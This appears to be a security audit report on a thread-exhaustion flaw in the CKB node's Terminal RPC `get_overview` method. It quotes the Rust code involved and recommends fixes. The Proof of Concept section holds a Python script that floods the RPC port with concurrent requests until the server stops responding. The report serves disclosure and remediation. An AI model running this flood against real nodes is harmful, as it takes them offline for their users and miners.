The code evidence is conclusive. Let me trace the full call chain.

**Confirmed facts from the code:**

1. `send_message!` macro in `tx-pool/src/service.rs:182` uses `block_in_place(|| response.recv())` — a synchronous crossbeam channel receive that blocks the calling tokio thread until the tx-pool service processes the queued message and replies. [1](#0-0) 

2. `TerminalRpcImpl::get_tx_pool_info` (called when `refresh & 0x4 != 0`) calls `self.shared.get_block_template(...)`, which routes through `TxPoolController::get_block_template`, which expands the `send_message!` macro — triggering `block_in_place`. [2](#0-1) 

3. `get_overview` is a **synchronous** `fn`, not `async fn`, called from the async axum handler `handle_jsonrpc`. Every invocation with `refresh=4` (TX_POOL_INFO bit) bypasses the 2-second cache and executes the blocking path. [3](#0-2) 

4. The axum server runs on the shared tokio runtime handle passed in from outside; `block_in_place` blocks the worker thread in place while waiting for the tx-pool event loop to dequeue and respond to the `BlockTemplate` message. [4](#0-3) 

5. The only protection is a 30-second `TimeoutLayer` — not a concurrency cap on `get_overview`. [5](#0-4) 

---

### Title
RPC Thread-Pool Exhaustion via Unbounded `block_in_place` in `get_overview(refresh=4)` — (`rpc/src/module/terminal.rs`)

### Summary
When the Terminal RPC module is enabled, any unauthenticated caller can send concurrent `get_overview` requests with `refresh=4`. Each request synchronously blocks a tokio worker thread inside `block_in_place(|| response.recv())` while waiting for the tx-pool service to process a `BlockTemplate` message. Under tx-pool load, this wait is arbitrarily long. With enough concurrent requests the entire tokio thread pool is occupied, rendering the RPC server unresponsive to all other methods.

### Finding Description
`TerminalRpcImpl::get_tx_pool_info` is invoked on every `get_overview` call where the `TX_POOL_INFO` refresh bit (0x4) is set. It unconditionally calls `self.shared.get_block_template(None, None, None)`, which delegates to `TxPoolController::get_block_template`. [6](#0-5) 

That function expands the `send_message!` macro:
```
try_send(Message::BlockTemplate(...))   // non-blocking enqueue
block_in_place(|| response.recv())      // BLOCKS the tokio thread
``` [1](#0-0) 

The tx-pool service processes `BlockTemplate` messages sequentially in its async event loop. Under load (e.g., a large verify queue), each `BlockTemplate` message may wait behind many pending items. Every concurrent `get_overview(4)` call holds one tokio worker thread in `block_in_place` for the entire duration. There is no semaphore, concurrency limit, or per-method timeout shorter than the global 30-second `TimeoutLayer`.

### Impact Explanation
All tokio worker threads become occupied in `block_in_place`. Because the tx-pool service tasks also run on the same shared runtime, a secondary effect is that the tx-pool event loop itself is starved, extending the blocking duration and creating a self-reinforcing condition. During the window (up to 30 s per wave, continuously renewable), **all** RPC methods — `get_tip_block_number`, `send_transaction`, `get_block_template` for miners, etc. — time out or queue indefinitely. The node appears offline to clients and miners.

### Likelihood Explanation
- The Terminal module must be operator-enabled, which narrows exposure. However, it is a documented, supported feature intended for production monitoring dashboards.
- Once enabled, the endpoint is unauthenticated (standard CKB RPC has no per-method auth).
- The attacker needs only HTTP access to the RPC port and the ability to issue concurrent requests — no keys, no PoW, no peer relationship required.
- Filling the verify queue (precondition for slow `BlockTemplate` responses) is achievable by submitting many low-fee transactions via `send_transaction`.

### Recommendation
1. Replace `block_in_place(|| response.recv())` in the `send_message!` macro with a proper async oneshot channel (`tokio::sync::oneshot`) and `.await`, so the tokio thread is yielded rather than blocked.
2. Add a per-method concurrency limiter (e.g., `tokio::sync::Semaphore`) on `get_overview` to cap simultaneous in-flight requests.
3. Apply a shorter, per-call timeout specifically on the `get_block_template` sub-call inside `get_tx_pool_info`.
4. Consider separating the Terminal RPC handler onto a dedicated thread pool (`spawn_blocking`) so thread exhaustion there cannot affect the main RPC runtime.

### Proof of Concept
```python
import asyncio, aiohttp, json

TARGET = "http://127.0.0.1:8114"

async def flood(session, i):
    payload = {"jsonrpc":"2.0","method":"get_overview","params":[4],"id":i}
    async with session.post(TARGET, json=payload) as r:
        return await r.text()

async def check_liveness(session):
    payload = {"jsonrpc":"2.0","method":"get_tip_block_number","params":[],"id":9999}
    try:
        async with session.post(TARGET, json=payload, timeout=aiohttp.ClientTimeout(total=3)) as r:
            return r.status == 200
    except Exception:
        return False

async def main():
    # Step 1: fill verify queue with low-fee txs (omitted for brevity)
    async with aiohttp.ClientSession() as session:
        # Step 2: flood with concurrent get_overview(4)
        tasks = [flood(session, i) for i in range(64)]
        asyncio.gather(*tasks)   # fire and forget
        await asyncio.sleep(1)
        # Step 3: assert liveness failure
        alive = await check_liveness(session)
        assert not alive, "RPC should be unresponsive"
        print("CONFIRMED: RPC unresponsive during flood")

asyncio.run(main())
```

### Citations

**File:** tx-pool/src/service.rs (L171-186)
```rust
macro_rules! send_message {
    ($self:ident, $msg_type:ident, $args:expr) => {{
        let (responder, response) = oneshot::channel();
        let request = Request::call($args, responder);
        $self
            .sender
            .try_send(Message::$msg_type(request))
            .map_err(|e| {
                let (_m, e) = handle_try_send_error(e);
                e
            })?;
        block_in_place(|| response.recv())
            .map_err(handle_recv_error)
            .map_err(Into::into)
    }};
}
```

**File:** tx-pool/src/service.rs (L219-230)
```rust
    pub fn get_block_template(
        &self,
        bytes_limit: Option<u64>,
        proposals_limit: Option<u64>,
        max_version: Option<Version>,
    ) -> Result<BlockTemplateResult, AnyError> {
        send_message!(
            self,
            BlockTemplate,
            (bytes_limit, proposals_limit, max_version)
        )
    }
```

**File:** rpc/src/module/terminal.rs (L440-464)
```rust
    fn get_overview(&self, refresh: Option<u32>) -> Result<Overview> {
        let refresh = refresh
            .and_then(RefreshKind::from_bits)
            .unwrap_or(RefreshKind::NOTHING);

        // If refresh everything, clear cache first
        if refresh.contains(RefreshKind::EVERYTHING) {
            self.cache.clear_all();
        }

        let sys = self.get_sys_info(refresh)?;
        let mining = self.get_mining_info(refresh)?;
        let pool = self.get_tx_pool_info(refresh)?;
        let cells = self.get_cells_info(refresh)?;
        let network = self.get_network_info(refresh)?;

        Ok(Overview {
            sys,
            cells,
            mining,
            pool,
            network,
            version: self.network_controller.version().to_owned(),
        })
    }
```

**File:** rpc/src/module/terminal.rs (L590-600)
```rust
        let block_template = self
            .shared
            .get_block_template(None, None, None)
            .map_err(|err| {
                error!("Send get_block_template request error {}", err);
                RPCError::ckb_internal_error(err)
            })?
            .map_err(|err| {
                error!("Get_block_template result error {}", err);
                RPCError::from_any_error(err)
            })?;
```

**File:** rpc/src/server.rs (L119-130)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));

```
